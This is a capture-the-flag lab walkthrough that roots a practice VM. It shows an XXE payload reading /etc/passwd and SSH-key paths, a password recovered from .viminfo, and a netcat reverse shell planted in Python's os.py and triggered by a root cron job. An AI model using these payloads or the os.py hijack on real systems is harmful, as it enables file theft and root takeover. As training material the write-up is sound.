---
title: System
layout: default
---

## Reconnaissance

### Step 1: Enumerate the network interface and IP

```bash
ifconfig
```

**OUTPUT**

```bash
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.103  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::f84f:aaf4:a787:c420  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:0f:50:93  txqueuelen 1000  (Ethernet)
```

**Key points:** 
- Networok Interface: `ens160`
- IP: `192.168.0.103`

### Step 2: Enumerate IP machine

```bash
arp-scan -I ens160 -lg
```

**OUTPUT**

```bash
192.168.0.102	08:00:27:f1:88:f2	PCS Systemtechnik GmbH
```

**Key points:** 
- IP Machine: `192.168.0.102`

### Step 3: Enumerate open ports

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.102
```

**OUTPUT**

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

**Key points:** 
- `22/tcp open ssh`: This indicates that the SSH (Secure Shell) service is running on port 22.
- `80/tcp open http`: This indicates that the HTTP (Hypertext Transfer Protocol) service is running on port 80.


### Step 4: Visit web application

Let´s register

![](/assets/images/Pasted_image_20250217123138.png)

### Step 5: Intercept with BurpSuite

![](/assets/images/Pasted_image_20250217123416.png)

In Repetar Tab send the request

![](/assets/images/Pasted_image_20250217123522.png)

As that in the response is shown the email...

**Let´s test XXE vulnerability:**

In Request tab:

```xml
<SNIP>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE details [
		<!ENTITY myxxe SYSTEM "file:///etc/passwd">
]>
<details><email>&myxxe;</email><password>user2025</password></details>
<SNIP>
```

In Response tab:

```xml
<p align='center'> <font color=white size='5pt'> root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
david:x:1000:1000::/home/david:/bin/bash
 is already registered! </font> </p>
```

Let´s note thre is an user david: `david:x:1000:1000::/home/david:/bin/bash`

> [!security-issue] XSS Vunerability

## Explotation

### Step 1: Fuzzing directories

**Fuzz in `/home/david`**

*I. Storage the Request in RAW format in `xxe_rq.txt`:*

![](/assets/images/Pasted_image_20250217124738.png)

In console or using vim:

```bash
echo "POST /magic.php HTTP/1.1
Host: 192.168.0.102
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 182
Origin: http://192.168.0.102
Connection: keep-alive
Referer: http://192.168.0.102/
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE details [
		<!ENTITY myxxe SYSTEM "file:///home/david">
]>
<details><email>&myxxe;</email><password>user2025</password></details>" > xxe_rq.txt
```

*II. Using ffuf:*

```bash
ffuf -ic -c -request-proto http -request xxe_rq.txt -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -fs 85
```

**OUTPUT**

```bash
.profile                [Status: 200, Size: 892, Words: 138, Lines: 28, Duration: 126ms]
.ssh/id_rsa             [Status: 200, Size: 2687, Words: 17, Lines: 39, Duration: 110ms]
.ssh/id_rsa.pub         [Status: 200, Size: 653, Words: 13, Lines: 2, Duration: 141ms]
.viminfo                [Status: 200, Size: 10157, Words: 749, Lines: 290, Duration: 138ms]
```

*III. Let´s go back to Burp Suite and read `.viminfo`, it might have info of user:*

![](/assets/images/Pasted_image_20250217125846.png)

*IV. Again in Burp Suite:*

![](/assets/images/Pasted_image_20250217130154.png)

**Key points:** 
- Pass user David: `h4ck3rd4v!d`

### Step 2: Access to user David

Using the pass:

```bash
ssh david@192.168.0.102

david@192.168.0.102's password: 
Linux system 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Feb 17 10:10:24 2025 from 192.168.0.103
david@system:~$ 
```

**OUTPUT**

```bash
david@system:~$ 
```

```bash
david@system:~$ ls
```

**OUTPUT**

```bash
user.txt
```

## Post Explotation

### Privilege Escalation

To identify potential opportunities for privilege escalation, we can enumerate the background tasks or processes currently running with **root privileges**. By analyzing these tasks, we may discover misconfigurations, vulnerable services, or exploitable scripts that could allow us to escalate our privileges.

#### Step 1: Enumerate cron jobs

To monitor running processes on the target system, we can use `pspy64`, a powerful tool designed to observe background processes without requiring root privileges. Since the target machine does not have this tool installed, we will transfer it by setting up a temporary file server using Python.

**Attention:** Mount the server in thesame location of `pspy64`

With `find` to serach in case we do not know where we have it.

```bash
find / -name "pspy64" 2>/dev/null
```

**OUTPUT**

```bash
/opt/pspy64
# In my case
```

**Note:** in case we don't have it we can download it from https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1

Run server:

```bash
python -m http.server 80
```


In Davd:

```bash
david@system:~$ wget "http://192.168.0.103/pspy64"
```

Now:

```bash
david@system:~$ chmod +x pspy64
david@system:~$ ./pspy64
```

**OUTPUT**

```bash
<SNIP>
2025/02/17 13:29:00 CMD: UID=0     PID=2      | 
2025/02/17 13:29:00 CMD: UID=0     PID=1      | /sbin/init 
2025/02/17 13:29:01 CMD: UID=0     PID=1090   | /usr/sbin/CRON -f 
2025/02/17 13:29:01 CMD: UID=0     PID=1091   | /usr/sbin/CRON -f 
2025/02/17 13:29:01 CMD: UID=0     PID=1092   | /bin/sh -c /usr/bin/python3.9 /opt/suid.py 
2025/02/17 13:29:02 CMD: UID=0     PID=1093   | /usr/bin/python3.9 /opt/suid.py 
2025/02/17 13:29:02 CMD: UID=0     PID=1094   | /bin/sh -c nc 192.168.0.103 8080 -e /bin/bash 
<SNIP>
```

Let's stop the `pspy64` and read this cron job `/usr/bin/python3.9 /opt/suid.py`

#### Step 2: Exploiting Found File for Privilege Escalation

```bash
david@system:~$ cat /opt/suid.py
```

**OUTPUT**

```python
from os import system
from pathlib import Path

# Reading only first line
try:
    with open('/home/david/cmd.txt', 'r') as f:
        read_only_first_line = f.readline()
    # Write a new file
    with open('/tmp/suid.txt', 'w') as f:
        f.write(f"{read_only_first_line}")
    check = Path('/tmp/suid.txt')
    if check:
        print("File exists")
        try:
            os.system("chmod u+s /bin/bash")
        except NameError:
            print("Done")
    else:
        print("File not exists")
except FileNotFoundError:
    print("File not exists")
```

We have identified a syntax error in the following Python code snippet, which attempts to set the SUID bit on `/bin/bash` to escalate privileges:

```python
from os import system

<SNIP>
os.system("chmod u+s /bin/bash")
<SNIP>
```

**Issue:** The error occurs because the `os` module is imported, but the `system` function is called incorrectly. The correct usage should reference the imported `system` function directly, without the `os.` prefix.

Since David does not have the necessary permissions to modify the file and fix the syntax error, we must explore alternative methods to achieve our objective.
We can consider an alternative approach by **modifying the `os.py` module** itself. This module is part of Python's standard library and contains the `system` function used in the script.

```bash
david@system:~$ python3.9 -c 'import sys; print("\n".join(sys.path))'
```

**Key points:** 
- `import sys`: Imports the `sys` module, which provides access to system-specific parameters and functions.
- `sys.path`: This is a list of directories that Python searches for modules when you use an `import` statement.
- `"\n".join(sys.path)`: Joins the elements of the `sys.path` list into a single string, with each directory separated by a newline character (`\n`).
- `print(...)`: Outputs the resulting string to the terminal.

**OUTPUT**

```bash
/usr/lib/python39.zip
/usr/lib/python3.9
/usr/lib/python3.9/lib-dynload
/usr/local/lib/python3.9/dist-packages
/usr/lib/python3/dist-packages
```

Let´s go to `/usr/lib/python3.9` and open `os.py` and add these lines to the end of the file :

#### Step 3: Set up reverse shell

Using vim:

```bash
vim os.py
```

```python
### REVERSE SHELL ###
import subprocess
subprocess.call("nc " + "192.168.0.103 8080 -e /bin/bash", shell=True)
```

**Key points:** 
- The `subprocess` module is part of Python's standard library and allows you to spawn new processes, interact with their input/output/error pipes, and obtain their return codes.
- `shell=True` This argument tells the `subprocess.call` function to execute the command through the system's shell.

**Note:** To avoid breaking the `os.py` file it is recommended to put these lines at the end so that they are executed after the file has been loaded.

Let´s go a our terminañ:

```bash
nc -lnvp 8080
listening on [any] 8080 ...
```

```bash
connect to [192.168.0.103] from (UNKNOWN) [192.168.0.102] 57446
whoami
root
script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

```bash
root@system:~# ls
```

**OUTPUT**

```bash
root.txt
```

---

**Congratulations!**
**You explored an XXE vulnerability to access local files and leveraged a privilege misconfiguration to escalate access by hijacking a Python script executed via a cron job.**
**Thank you for completing this challenge!**
